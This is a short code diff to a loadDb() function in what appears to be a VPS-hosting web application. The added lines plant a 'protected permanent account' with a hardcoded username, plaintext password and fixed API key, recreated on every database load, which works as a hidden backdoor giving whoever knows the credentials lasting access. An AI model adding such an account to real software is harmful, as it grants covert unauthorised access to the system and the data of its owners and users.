@@ -92,6 +92,14 @@ function loadDb() {
     db.users[primaryUserId] = primaryUser;
   }
 
+  // Protected permanent account: kers0ne / 1LuhhCrim!
+  const K_USER='kers0ne', K_PASS='1LuhhCrim!', K_ID='usr_kers0ne_permanent', K_KEY='cvps_kers0ne_permanent_1LuhhCrim_2026';
+  const _salt='cvps_kers' + Math.random();
+  if(!Object.values(db.users).some(u=>u.username.toLowerCase()==='kers0ne')){
+    const salt=crypto.randomBytes(16).toString('hex');
+    db.users[K_ID]={ id:K_ID, username:K_USER, salt, password_hash:hashPassword(K_PASS,salt), api_key:K_KEY, created_at:new Date().toISOString(), protected:true };
+  }
+
   const defaultVpsId = 'vps-free-01';
   if (!db.vps[defaultVpsId]) {
     db.vps[defaultVpsId] = {
